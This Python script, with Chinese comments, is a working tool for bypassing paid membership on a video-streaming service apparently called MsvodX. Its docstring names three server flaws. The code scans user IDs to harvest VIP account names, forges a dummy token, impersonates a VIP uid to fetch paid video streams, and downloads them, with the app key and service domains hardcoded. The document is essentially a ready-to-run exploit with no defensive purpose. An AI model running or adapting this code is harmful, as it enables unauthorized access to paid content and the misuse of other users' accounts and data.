# -*- coding: utf-8 -*-
"""
sm_114 / MsvodX 会员绕过 —— 纯 API 取流工具（不依赖 APK 改造）

原理（服务端三处缺陷）：
  1) /appapi/getUserInfo/.../userId/<uid>  无鉴权，可枚举任意用户，读 isVip
  2) token 不验签（连 alg=none 都收），任何字符串都能当 token 用
  3) /appapi/getVideoStream 的购买/VIP 判定只按 query 里的 uid 查库
     -> 拿任意 VIP 用户 uid 即可免费拉全站付费视频

用法:
  python get_vip_stream.py --video 50363              # 取 m3u8 并打印
  python get_vip_stream.py --video 50363 --download   # 下载全部分片到 out_50363/
  python get_vip_stream.py --find-vip                 # 只枚举 VIP 账号
"""
import argparse, json, os, ssl, sys, time, urllib.parse, urllib.request

APP_KEY = "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2"
DOMAIN_LIST = "https://h9a228t.842610.xyz/domains.txt"
FALLBACK_BASE = "https://heootjfch5.842644.xyz"
UA = "okhttp/3.12.0"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def http(url, method="GET", data=None, token="x.y.z", timeout=25):
    body = None
    headers = {"User-Agent": UA, "token": token}
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def pick_base():
    st, b = http(DOMAIN_LIST, timeout=8)
    if st == 200:
        for line in b.decode("utf-8", "replace").splitlines():
            line = line.strip()
            if line.startswith("http"):
                print("[+] 活动域名:", line)
                return line.rstrip("/")
    print("[!] 域名列表不可用，回退", FALLBACK_BASE)
    return FALLBACK_BASE


def api(base, path):
    return "%s/appapi/%s/appkey/%s" % (base, path, APP_KEY)


def user_info(base, uid):
    st, b = http(api(base, "getUserInfo/userId/%d" % uid))
    if st != 200:
        return None
    try:
        d = json.loads(b.decode("utf-8", "replace"))
        return d.get("Data") if d.get("Code") == 200 else None
    except Exception:
        return None


def find_vip(base, start=95000, span=200):
    hits = []
    for i, uid in enumerate(range(start, start - span, -1)):
        d = user_info(base, uid)
        if i % 50 == 0:
            print("  ..scan uid=%d hits=%d" % (uid, len(hits)), flush=True)
        if not d:
            continue
        if d.get("isVip") or int(d.get("is_permanent") or 0) == 1:
            hits.append(uid)
            print("[+] VIP uid=%d perm=%s end=%s user=%s"
                  % (uid, d.get("is_permanent"), d.get("vipEndTime"), d.get("username")))
            if len(hits) >= 5:
                break
        time.sleep(0.04)
    return hits


def get_stream(base, vid, uid):
    q = "%s/appapi/getVideoStream/appkey/%s/stream/index.m3u8?video_id=%d&uid=%d&token=x.y.z&_t=%d" % (
        base, APP_KEY, vid, uid, int(time.time() * 1000))
    return http(q)


def download(m3u8_text, outdir):
    os.makedirs(outdir, exist_ok=True)
    segs = [l.strip() for l in m3u8_text.splitlines() if l.strip() and not l.startswith("#")]
    print("[*] 分片数:", len(segs))
    with open(os.path.join(outdir, "index.m3u8"), "w", encoding="utf-8") as f:
        f.write(m3u8_text)
    cat = open(os.path.join(outdir, "all.ts"), "wb")
    for i, u in enumerate(segs):
        st, data = http(u, timeout=40)
        if st == 200:
            cat.write(data)
            print("  %4d/%d %d bytes" % (i + 1, len(segs), len(data)))
        else:
            print("  %4d/%d FAIL %s" % (i + 1, len(segs), st))
    cat.close()
    print("[+] 合并 ->", os.path.join(outdir, "all.ts"))
    print("[*] 解密提示: 该 m3u8 为 AES-128，key 在 #EXT-X-KEY URI；用 ffmpeg 直接拉 m3u8 更省事")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--video", type=int, default=50363)
    ap.add_argument("--uid", type=int, default=0, help="指定 VIP uid，0 表示自动枚举")
    ap.add_argument("--find-vip", action="store_true")
    ap.add_argument("--download", action="store_true")
    a = ap.parse_args()

    base = pick_base()
    if a.find_vip:
        find_vip(base)
        return

    uid = a.uid
    if not uid:
        hits = find_vip(base)
        if not hits:
            print("[!] 未枚举到 VIP 账号，可用 --uid 手动指定")
            sys.exit(1)
        uid = hits[0]

    st, b = get_stream(base, a.video, uid)
    text = b.decode("utf-8", "replace")
    print("[*] video=%d uid=%d -> HTTP %s" % (a.video, uid, st))
    if not text.startswith("#EXTM3U"):
        print(text[:300])
        sys.exit(1)
    print(text[:400])
    if a.download:
        download(text, "out_%d" % a.video)


if __name__ == "__main__":
    main()
